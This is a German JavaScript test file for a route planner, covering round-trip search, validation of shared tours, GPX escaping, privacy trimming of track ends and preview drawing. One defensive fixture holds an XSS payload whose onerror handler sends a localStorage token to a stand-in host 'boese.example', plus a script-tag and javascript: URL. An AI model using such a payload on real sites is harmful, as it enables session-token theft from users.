/* pruefe-kern.js - Selbsttest für die Rundtour-Suche in kern.js.

   Aufruf über pruefe.sh, oder von Hand im Projektordner:

     /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc pruefe-kern.js

   jsc liegt auf jedem Mac, es muss also nichts installiert werden. Die
   Datei läuft auch im Browser: Wenn kern.js dort schon geladen ist, kann
   der Inhalt in die Konsole geworfen werden.

   Wie in pruefe.sh gilt: Keine Ausgabe heißt, alles ist in Ordnung.

   Geprüft wird die Suche als Ganzes, mit einer künstlichen holeRoute().
   Die tut so, als käme sie von BRouter, legt aber genau die Route hin, die
   der Fall braucht - so lässt sich ein Verlauf nachstellen, der in echt nur
   in bestimmten Gegenden auftritt und den man dort nicht auf Zuruf
   herbeiführen kann.                                                      */

if (typeof sucheRundtour === 'undefined') load('kern.js');
if (typeof linienBild === 'undefined') load('vorschau.js');

// jsc kennt print(), der Browser kennt console.log(). Auf print() darf hier
// nicht geprüft werden: Im Browser gibt es das auch, dort öffnet es aber
// den Druckdialog.
var sage = (typeof console === 'object' && console && console.log)
  ? function (text) { console.log(text); }
  : print;

var fehler = 0;

function stimmt(bedingung, was) {
  if (!bedingung) { fehler++; sage('FEHLGESCHLAGEN: ' + was); }
}


/* --- Zufall festnageln -------------------------------------------------
   Die Suche würfelt an einem Dutzend Stellen. Für einen Test, der morgen
   dasselbe sagt wie heute, wird Math.random durch eine feste Folge
   ersetzt und am Ende wieder zurückgegeben.                              */

var echterZufall = Math.random;
var saat = 12345;
Math.random = function () {
  saat = (saat * 1103515245 + 12345) % 2147483648;
  return saat / 2147483648;
};


/* --- 1. Ein NaN-Radius vergiftet jeden Punkt ---------------------------
   Das ist die Rechnung, die den Fehler ausgelöst hat: der mittlere Abstand
   über eine leere Punktliste. In JavaScript ist 0/0 nicht etwa 0, sondern
   NaN, und NaN pflanzt sich durch jede weitere Rechnung fort. Diese Prüfung
   hält fest, warum der Radius niemals so entstehen darf.                 */

var start = { lat: 49.79, lon: 9.95 }; // Würzburg

var keinePunkte = [];
var mittlererAbstand = keinePunkte.reduce(
  function (summe, p) { return summe + haversine(start.lat, start.lon, p.lat, p.lon); },
  0) / keinePunkte.length;

stimmt(Number.isNaN(mittlererAbstand),
  'der mittlere Abstand über eine leere Punktliste müsste NaN sein');

var vergiftet = randomLoopPoints(start, mittlererAbstand, 3, null, []);
stimmt(vergiftet.every(function (p) { return Number.isNaN(p.lat) && Number.isNaN(p.lon); }),
  'ein NaN-Radius müsste Punkte ohne brauchbare Koordinaten liefern');


/* --- 2. Die künstliche Route ------------------------------------------
   Zwei Bausteine reichen: eine gerade Strecke und eine Sackgasse. Die
   Streckenpunkte liegen etwa 50 Meter auseinander, so wie BRouter sie
   liefert, und im selben Format [lon, lat, höhe].                        */

function legeStrecke(von, nach, ziel) {
  var meter = haversine(von.lat, von.lon, nach.lat, nach.lon);
  var schritte = Math.max(1, Math.round(meter / 50));
  for (var i = 1; i <= schritte; i++) {
    var anteil = i / schritte;
    ziel.push([
      von.lon + (nach.lon - von.lon) * anteil,
      von.lat + (nach.lat - von.lat) * anteil,
      200, // überall gleich hoch, sonst hält findeSackgassen() die
    ]);    // beiden Fahrtrichtungen für übereinanderliegende Serpentinen
  }
}

// Fährt vom Abzweig zum Punkt und auf derselben Straße wieder zurück -
// genau das, was findeSackgassen() als doppelt gefahren erkennt. Der
// Abzweig liegt drei Kilometer vor dem Punkt auf der Linie vom Start aus,
// damit das doppelte Stück lang genug für die 400-Meter-Schwelle ist.
function legeSackgasse(vonHier, punkt, ziel) {
  var winkel = bearing([start.lon, start.lat], [punkt.lon, punkt.lat]);
  var abstand = haversine(start.lat, start.lon, punkt.lat, punkt.lon);
  var abzweig = destinationPoint(start.lat, start.lon, winkel, Math.max(500, abstand - 3000));

  legeStrecke(vonHier, abzweig, ziel);

  var hin = [];
  legeStrecke(abzweig, punkt, hin);
  for (var i = 0; i < hin.length; i++) ziel.push(hin[i]);
  for (var k = hin.length - 2; k >= 0; k--) ziel.push(hin[k]);
  ziel.push([abzweig.lon, abzweig.lat, 200]);

  return abzweig; // von hier geht es weiter
}


/* --- 3. Der Fall: alle Zufallspunkte werden weggestrichen --------------
   Mit festen Zwischenstopps ist MINDEST_ZUFALLSPUNKTE null, repariereSack-
   gassen() darf die Zufallspunkte also bis auf den letzten wegstreichen.
   Die künstliche holeRoute() legt in JEDEN Zufallspunkt eine Sackgasse und
   erzwingt damit genau das. Übrig bleibt die saubere, aber viel zu kurze
   Fahrt über die festen Punkte - und mit ihr eine leere Punktliste.

   Vor der Reparatur lief die Suche ab hier leer: Es gab keine Form mehr
   zum Aufziehen, also wurde bis zum letzten Versuch immer wieder dieselbe
   Route angefragt. Genau darauf schaut diese Prüfung.                    */

var stoppA = destinationPoint(start.lat, start.lon, 60, 15000);
var stoppB = destinationPoint(start.lat, start.lon, 180, 15000);
var festeStopps = [stoppA, stoppB];

var angefragt = []; // was die Suche der Reihe nach berechnen lassen wollte

function künstlicheHoleRoute(punkte, routing, variante) {
  var zufallspunkte = punkte.filter(function (p, i) {
    return i > 0 && i < punkte.length - 1 && festeStopps.indexOf(p) === -1;
  });

  angefragt.push({
    zufallspunkte: zufallspunkte.length,
    hatNaN: punkte.some(function (p) { return !isFinite(p.lat) || !isFinite(p.lon); }),
  });

  var coords = [[start.lon, start.lat, 200]];
  var hier = start;

  for (var i = 1; i < punkte.length; i++) {
    var wegpunkt = punkte[i];
    var istZufallspunkt = festeStopps.indexOf(wegpunkt) === -1 && i < punkte.length - 1;

    if (istZufallspunkt) {
      hier = legeSackgasse(hier, wegpunkt, coords);
    } else {
      legeStrecke(hier, wegpunkt, coords);
      hier = wegpunkt;
    }
  }

  var meter = 0;
  for (var k = 1; k < coords.length; k++) {
    meter += haversine(coords[k - 1][1], coords[k - 1][0], coords[k][1], coords[k][0]);
  }

  return Promise.resolve({ coords: coords, distance: meter });
}

var melde = {
  holeRoute: künstlicheHoleRoute,
  fortschritt: function () {},
  hinweis: function () {},
};

var profil = {
  routing: 'car-eco',
  kurvigkeit: 0.5,
  zwischenstopps: festeStopps,
  richtung: null,
};

sucheRundtour(start, 120, profil, melde).then(function (ergebnis) {
  stimmt(ergebnis !== null, 'die Suche müsste die saubere Runde über die festen Stopps liefern');

  if (ergebnis) {
    stimmt(isFinite(ergebnis.beste.distance),
      'die gefundene Route müsste eine echte Länge haben, nicht NaN');
    stimmt(isFinite(ergebnis.abweichung),
      'die Abweichung von der Wunschlänge müsste eine Zahl sein, nicht NaN');
  }

  stimmt(angefragt.every(function (a) { return !a.hatNaN; }),
    'die Suche dürfte nie eine Route durch Punkte ohne Koordinaten anfragen');

  // Der erste Aufruf ermittelt die Fixkosten der festen Stopps und hat
  // deshalb immer null Zufallspunkte - der zählt hier nicht mit.
  var ohnePunkte = 0, leerlauf = 0;
  for (var i = 1; i < angefragt.length; i++) {
    if (angefragt[i].zufallspunkte !== 0) continue;
    ohnePunkte++;
    if (angefragt[i - 1].zufallspunkte === 0) leerlauf++;
  }

  // Ohne diese Prüfung wäre der Test wertlos: Würden nie alle Zufallspunkte
  // weggestrichen, ginge die nächste Prüfung durch, ohne je den Fall
  // gesehen zu haben, um den es hier geht.
  stimmt(ohnePunkte > 0,
    'der Testfall wurde nicht erreicht - die Suche hat nie alle '
    + 'Zufallspunkte weggestrichen, die künstliche Route legt also '
    + 'keine erkennbaren Sackgassen mehr');

  // Der springende Punkt: EIN Versuch ganz ohne Zufallspunkte ist in
  // Ordnung, so wird die reine Fahrt über die festen Stopps überhaupt erst
  // gemessen. Zweimal hintereinander heißt dagegen, dass die Suche sich
  // nicht mehr bewegt und bis zum Schluss dieselbe Route anfragt.
  stimmt(leerlauf === 0,
    'nachdem alle Zufallspunkte weggestrichen waren, lief die Suche '
    + leerlauf + ' Versuche lang leer, statt neue Punkte zu würfeln');

  Math.random = echterZufall;
  if (fehler > 0) sage(fehler + ' Prüfungen fehlgeschlagen.');
}).catch(function (grund) {
  Math.random = echterZufall;
  sage('FEHLGESCHLAGEN: die Suche ist abgestürzt - ' + grund + '\n' + (grund && grund.stack));
});

// jsc arbeitet die Promise-Warteschlange nicht von allein ab, bevor das
// Skript endet. Im Browser passiert das von selbst.
if (typeof drainMicrotasks === 'function') drainMicrotasks();


/* ---------------------------------------------------------------------------
   pruefeTour() - was vom Server kommt, ist erst einmal fremd.

   Diese Faelle sind der Grund, warum es die Funktion gibt: Sobald Routen
   geteilt werden, ist der Inhalt einer Tour eine Zuschrift von einem Fremden.
   Siehe SICHERHEIT.md, Befund B1.                                          */

function prüfeFall(beschreibung, bedingung) {
  if (!bedingung) print('FEHLER: ' + beschreibung);
}

// --- Der Angriff, um den es eigentlich geht -------------------------------
(function () {
  const angriff = {
    id: 'x',
    name: 'Harmlos',
    waypoints: [{ lat: 52.5, lon: 13.4 }],
    // Ein Feld, das die App gar nicht kennt, mit HTML darin.
    bild: 'data:x" onerror="fetch(\'https://boese.example/?d=\'+localStorage.getItem(\'token\'))',
    fotos: [{ id: '"><script>', bild: 'javascript:alert(1)' }],
  };
  const sauber = pruefeTour(angriff);
  prüfeFall('Angriff wird angenommen, aber entkernt', sauber !== null);
  prüfeFall('das erfundene Feld "bild" faellt weg', sauber.bild === undefined);
  prüfeFall('das erfundene Feld "fotos" faellt weg', sauber.fotos === undefined);
  prüfeFall('nur die bekannten Felder bleiben uebrig',
    Object.keys(sauber).sort().join(',') === 'id,name,track,waypoints');
})();

// --- Unbrauchbares wird abgewiesen statt repariert -------------------------
prüfeFall('null wird abgewiesen', pruefeTour(null) === null);
prüfeFall('eine Zeichenkette wird abgewiesen', pruefeTour('kaputt') === null);
prüfeFall('ein Feld wird abgewiesen', pruefeTour([1, 2, 3]) === null);
prüfeFall('ohne id wird abgewiesen',
  pruefeTour({ waypoints: [{ lat: 1, lon: 2 }] }) === null);
prüfeFall('ohne einen einzigen gueltigen Punkt wird abgewiesen',
  pruefeTour({ id: 'a', waypoints: ['x'], track: [] }) === null);

// --- Zahlen, die keine sind ------------------------------------------------
(function () {
  const t = pruefeTour({
    id: 'a',
    waypoints: [
      { lat: 52.5, lon: 13.4 },      // gut
      { lat: 'x', lon: 13.4 },       // Text statt Zahl
      { lat: 91, lon: 13.4 },        // ausserhalb des Bereichs
      { lat: NaN, lon: 13.4 },       // keine Zahl
      { lat: Infinity, lon: 13.4 },  // unendlich
      { lat: 48.1, lon: 11.6 },      // gut
    ],
  });
  prüfeFall('nur die zwei gueltigen Punkte bleiben', t.waypoints.length === 2);
  prüfeFall('ein Punkt traegt nur lat und lon',
    Object.keys(t.waypoints[0]).sort().join(',') === 'lat,lon');
})();

// --- Laengen werden gedeckelt ---------------------------------------------
(function () {
  const langerName = 'A'.repeat(500);
  const t = pruefeTour({ id: 'a', name: langerName, waypoints: [{ lat: 1, lon: 2 }] });
  prüfeFall('der Name wird gekuerzt', t.name.length === 120);

  // Die Spur wird im Format des GPS-Empfaengers geprueft: [Laenge, Breite].
  const vieleSpurpunkte = [];
  for (let i = 0; i < 25000; i++) vieleSpurpunkte.push([10, 50]);
  const t2 = pruefeTour({ id: 'a', track: vieleSpurpunkte });
  prüfeFall('die Streckenpunkte werden gedeckelt', t2.track.length === 20000);

  const vieleWegpunkte = [];
  for (let i = 0; i < 25000; i++) vieleWegpunkte.push({ lat: 50, lon: 10 });
  const t3 = pruefeTour({ id: 'a', waypoints: vieleWegpunkte });
  prüfeFall('die Wegpunkte werden gedeckelt', t3.waypoints.length === 20000);
})();

// --- Was gut ist, kommt unveraendert durch --------------------------------
(function () {
  const echt = {
    id: 'tour-1', name: 'Harz-Runde',
    waypoints: [{ lat: 51.8, lon: 10.6 }, { lat: 51.9, lon: 10.7 }],
    track: [[10.6, 51.8, 340]],
    distance: 12345, curviness: 280, aufgezeichnet: true,
  };
  const t = pruefeTour(echt);
  prüfeFall('Name bleibt', t.name === 'Harz-Runde');
  prüfeFall('Wegpunkte bleiben', t.waypoints.length === 2);
  prüfeFall('Entfernung bleibt', t.distance === 12345);
  prüfeFall('Kurvigkeit bleibt', t.curviness === 280);
  prüfeFall('aufgezeichnet bleibt', t.aufgezeichnet === true);
})();


/* --- xmlSicher(): der Tourname darf die GPX-Datei nicht sprengen ---------- */
prüfeFall('kaufmaennisches Und wird ersetzt',
  xmlSicher('Eifel & Mosel') === 'Eifel &amp; Mosel');
prüfeFall('spitze Klammern werden ersetzt',
  xmlSicher('<trk>') === '&lt;trk&gt;');
prüfeFall('Anfuehrungszeichen werden ersetzt',
  xmlSicher('Der "gute" Weg') === 'Der &quot;gute&quot; Weg');
prüfeFall('null wird zu leerem Text', xmlSicher(null) === '');
prüfeFall('normaler Name bleibt unveraendert',
  xmlSicher('Harz-Runde') === 'Harz-Runde');
(function () {
  const gpx = baueGpx([[10.5, 51.8, 300]], 'Eifel & <Mosel>');
  prüfeFall('die fertige GPX-Datei enthaelt kein nacktes Und',
    !/&(?!amp;|lt;|gt;|quot;|apos;)/.test(gpx));
  prüfeFall('der Name steht maskiert in der Datei',
    gpx.indexOf('Eifel &amp; &lt;Mosel&gt;') > -1);
})();


/* --- säubreSpur(): eine Aufzeichnung hat ein anderes Format ----------------
   Bis zum 28.08.2026 lief die Spur durch säubrePunkte() und wurde dabei
   restlos verworfen. Diese Pruefungen halten fest, dass beide Formate
   nebeneinander bestehen und keines das andere frisst.                     */
(function () {
  const spur = [[9.95, 49.79, 200], [9.96, 49.80]];
  const s = säubreSpur(spur);
  prüfeFall('eine Spur ueberlebt die Pruefung', s.length === 2);
  prüfeFall('die Hoehe bleibt, wo es eine gibt', s[0][2] === 200);
  prüfeFall('ohne Hoehe bleiben zwei Zahlen', s[1].length === 2);

  prüfeFall('vertauschte Bereiche fallen weg',
    säubreSpur([[200, 49.79]]).length === 0);
  prüfeFall('Wegpunkt-Objekte sind keine Spur',
    säubreSpur([{ lat: 49.79, lon: 9.95 }]).length === 0);
  prüfeFall('Spur-Punkte sind keine Wegpunkte',
    säubrePunkte([[9.95, 49.79]]).length === 0);

  const t = pruefeTour({ id: 'a1', name: 'Ausfahrt', aufgezeichnet: true,
                         track: spur, waypoints: [] });
  prüfeFall('eine aufgezeichnete Tour kommt jetzt durch', t !== null);
  prüfeFall('ihre Spur ist vollstaendig', t.track.length === 2);
})();


/* --- kuerzeSpurEnden(): Haustuer verwischen, Strecke lassen --------------- */
(function () {
  // Eine gerade Fahrt nach Osten: 120 Punkte im Abstand von je rund
  // 70 Metern, macht etwa 8,5 Kilometer. Lang genug, dass auch der groesste
  // Schutzabstand (zweimal 900 m) noch reichlich uebrig laesst.
  const gerade = [];
  for (let i = 0; i < 120; i++) gerade.push([9.95 + i * 0.001, 49.79]);

  const gekuerzt = kuerzeSpurEnden(gerade, 300);
  prüfeFall('von der geraden Fahrt bleibt etwas uebrig', gekuerzt.length > 0);
  prüfeFall('der Anfang ist weg', gekuerzt[0][0] > gerade[0][0]);
  prüfeFall('das Ende ist weg',
    gekuerzt[gekuerzt.length - 1][0] < gerade[gerade.length - 1][0]);
  prüfeFall('der erste bleibende Punkt liegt mindestens 300 m vom Start',
    haversine(49.79, gerade[0][0], 49.79, gekuerzt[0][0]) >= 300);
  prüfeFall('der letzte bleibende Punkt liegt mindestens 300 m vom Ziel',
    haversine(49.79, gerade[gerade.length - 1][0],
              49.79, gekuerzt[gekuerzt.length - 1][0]) >= 300);

  // Eine Runde, die wieder am Start endet. Ohne die Grenze in der Schleife
  // von hinten bliebe hier nichts uebrig - das ist der Fall, der die Grenze
  // ueberhaupt noetig macht.
  const runde = [];
  for (let i = 0; i <= 36; i++) {
    const winkel = (i / 36) * 2 * Math.PI;
    runde.push([9.95 + 0.02 * Math.sin(winkel), 49.79 + 0.013 * (1 - Math.cos(winkel))]);
  }
  prüfeFall('eine Rundtour verliert nicht ihre ganze Spur',
    kuerzeSpurEnden(runde, 300).length > 10);

  // Der ausgewuerfelte Abstand bleibt in seinen Grenzen, sonst waere die
  // Kuerzung entweder wirkungslos oder frisst kurze Fahrten auf.
  let kleinster = Infinity, groesster = 0;
  for (let i = 0; i < 200; i++) {
    const wert = schutzAbstand();
    kleinster = Math.min(kleinster, wert);
    groesster = Math.max(groesster, wert);
  }
  prüfeFall('der Schutzabstand bleibt ueber 300 m', kleinster >= 300);
  prüfeFall('der Schutzabstand bleibt unter 900 m', groesster <= 900);
  prüfeFall('der Schutzabstand ist nicht immer derselbe', groesster - kleinster > 100);

  // Zu kurz zum Teilen: 200 Meter am Stueck.
  prüfeFall('eine sehr kurze Fahrt bleibt leer',
    kuerzeSpurEnden([[9.95, 49.79], [9.9528, 49.79]]).length === 0);
  prüfeFall('eine leere Spur bleibt leer', kuerzeSpurEnden([]).length === 0);
})();


/* --- oeffentlicheTour(): es geht nur hinaus, was hinaus soll -------------- */
(function () {
  const gerade = [];
  for (let i = 0; i < 120; i++) gerade.push([9.95 + i * 0.001, 49.79]);

  const ausfahrt = oeffentlicheTour({
    id: 'x', name: 'Feierabendrunde', aufgezeichnet: true,
    track: gerade, waypoints: [],
    distance: 2200, curviness: 310, time: 300, maxKmh: 187,
    neigung: { links: 41, rechts: 38 },
    notizen: 'Bei Kilometer 3 steht immer die Polizei',
    fotos: [{ id: 1, pfad: 'geheim/1.jpg' }],
  });
  prüfeFall('die Notizen bleiben zu Hause', ausfahrt.notizen === undefined);
  prüfeFall('die Fotos bleiben zu Hause', ausfahrt.fotos === undefined);
  prüfeFall('die Hoechstgeschwindigkeit geht nicht mit', ausfahrt.maxKmh === undefined);
  prüfeFall('die Schraeglage geht nicht mit', ausfahrt.neigung === undefined);
  prüfeFall('der Name gehoert nicht in die Daten', ausfahrt.name === undefined);
  prüfeFall('die Kurvigkeit geht mit', ausfahrt.curviness === 310);
  prüfeFall('die Spur ist beschnitten', ausfahrt.track.length < gerade.length);

  const geplant = oeffentlicheTour({
    id: 'y', aufgezeichnet: false,
    waypoints: [{ lat: 49.79, lon: 9.95 }, { lat: 49.9, lon: 10.1 }],
    roundtrip: true, roundtripKm: 150, roundtripRichtung: 'sued',
  });
  prüfeFall('eine geplante Route behaelt ihre Wegpunkte', geplant.waypoints.length === 2);
  prüfeFall('die Rundtour bleibt eine Rundtour', geplant.roundtrip === true);
  prüfeFall('die Wunschlaenge geht mit', geplant.roundtripKm === 150);
  prüfeFall('eine erfundene Himmelsrichtung faellt weg',
    geplant.roundtripRichtung === undefined);

  prüfeFall('eine zu kurze Aufzeichnung laesst sich nicht teilen',
    oeffentlicheTour({ aufgezeichnet: true, track: [[9.95, 49.79], [9.9528, 49.79]] }) === null);
  prüfeFall('nichts drin, nichts raus', oeffentlicheTour(null) === null);
})();


/* --- startPunktVon(): worauf die Umkreissuche zeigt ----------------------- */
prüfeFall('bei einer Aufzeichnung zaehlt der erste Spurpunkt',
  startPunktVon({ track: [[9.95, 49.79, 200]] }).lat === 49.79);
prüfeFall('bei einer geplanten Route zaehlt der erste Wegpunkt',
  startPunktVon({ waypoints: [{ lat: 51.8, lon: 10.6 }] }).lon === 10.6);
prüfeFall('ohne Punkte gibt es keinen Startpunkt',
  startPunktVon({ waypoints: [], track: [] }) === null);


/* --- vorschauLinie(): ausduennen, ohne die Form zu verlieren --------------- */
(function () {
  // Eine Zickzacklinie: 400 Punkte, jeder zweite ausgelenkt. Hier zaehlt
  // JEDER Punkt, das Verfahren darf also nicht einfach alles wegwerfen.
  const zickzack = [];
  for (let i = 0; i < 400; i++) zickzack.push([9.0 + i * 0.001, 50.0 + (i % 2) * 0.004]);
  const duenn = vorschauLinie(zickzack, 90);
  prüfeFall('die Zickzacklinie wird auf die Obergrenze gebracht', duenn.length <= 90);
  prüfeFall('sie behaelt ihren Anfang', duenn[0][0] === zickzack[0][0]);
  prüfeFall('sie behaelt ihr Ende',
    duenn[duenn.length - 1][0] === zickzack[zickzack.length - 1][0]);

  // Eine schnurgerade Linie schrumpft auf ihre zwei Enden - genau das ist
  // der Zweck des Verfahrens.
  const gerade = [];
  for (let i = 0; i < 400; i++) gerade.push([9.0 + i * 0.001, 50.0]);
  prüfeFall('aus einer Geraden werden zwei Punkte', vereinfacheLinie(gerade, 0.0001).length === 2);

  // Kurze Linien bleiben unangetastet.
  prüfeFall('eine kurze Linie bleibt ganz', vorschauLinie(gerade.slice(0, 5), 90).length === 5);
  prüfeFall('nichts drin, nichts raus', vorschauLinie(null, 90).length === 0);
})();


/* --- linienBild(): die Form stimmt, der Rahmen haelt ---------------------- */
(function () {
  // Ein Quadrat von einem Zehntelgrad Kantenlaenge, weit im Norden. Dort
  // ist ein Laengengrad deutlich schmaler als ein Breitengrad - ohne die
  // Stauchung wuerde das Quadrat im Bild zum liegenden Rechteck.
  const quadrat = [[10.0, 54.0], [10.1, 54.0], [10.1, 54.1], [10.0, 54.1], [10.0, 54.0]];
  const bild = linienBild(quadrat);

  prüfeFall('es kommt ein Pfad heraus', typeof bild.pfad === 'string' && bild.pfad[0] === 'M');
  prüfeFall('der Pfad hat so viele Punkte wie die Linie',
    bild.pfad.split('L').length === quadrat.length);

  // Alle Punkte muessen im Bild liegen.
  const zahlen = bild.pfad.slice(1).split('L').map(s => s.split(' ').map(Number));
  prüfeFall('kein Punkt liegt ausserhalb des Bildes',
    zahlen.every(([x, y]) => x >= 0 && x <= bild.breite && y >= 0 && y <= bild.hoehe));

  // Die Stauchung macht aus dem Quadrat im Bild wieder ein Quadrat:
  // 0,1 Grad Laenge sind bei 54 Grad Breite nur cos(54) so breit wie
  // 0,1 Grad Breite. Die Seiten muessen sich also wie cos(54) verhalten.
  const xs = zahlen.map(p => p[0]), ys = zahlen.map(p => p[1]);
  const seitenVerhaeltnis = (Math.max(...xs) - Math.min(...xs))
                          / (Math.max(...ys) - Math.min(...ys));
  prüfeFall('die Laenge wird mit dem Kosinus der Breite gestaucht',
    Math.abs(seitenVerhaeltnis - Math.cos(54 * Math.PI / 180)) < 0.02);

  // Norden gehoert nach oben: Der noerdlichste Punkt hat das kleinste y.
  const nordIndex = quadrat.reduce((b, p, i) => p[1] > quadrat[b][1] ? i : b, 0);
  prüfeFall('Norden liegt oben im Bild',
    zahlen[nordIndex][1] === Math.min(...ys));

  prüfeFall('Start und Ziel sind vermerkt',
    Number.isFinite(bild.start.x) && Number.isFinite(bild.ziel.y));

  // Der Rahmen umschliesst die Linie: Die laengere Seite misst die volle
  // Kante, die kuerzere entsprechend weniger. Bei diesem Quadrat ist die
  // Hoehe die laengere Seite, weil die Breite gestaucht wird.
  prüfeFall('die laengere Seite fuellt den Rahmen aus',
    Math.abs(Math.max(bild.breite, bild.hoehe) - (320 + 24)) < 1);
  prüfeFall('die kuerzere Seite ist entsprechend schmaler',
    bild.breite < bild.hoehe);

  // Ein liegendes Rechteck muss anders herum herauskommen.
  const liegend = linienBild([[10.0, 50.0], [10.4, 50.0], [10.4, 50.05], [10.0, 50.0]]);
  prüfeFall('ein liegendes Rechteck wird breiter als hoch',
    liegend.breite > liegend.hoehe);

  // Eine Linie ohne Ausdehnung darf nicht durch null teilen.
  const punktförmig = linienBild([[10, 50], [10, 50], [10, 50]]);
  prüfeFall('eine Linie ohne Ausdehnung ergibt gueltige Zahlen',
    punktförmig === null || !/(NaN|Infinity)/.test(punktförmig.pfad));

  prüfeFall('zu wenige Punkte ergeben kein Bild', linienBild([[10, 50]]) === null);
})();
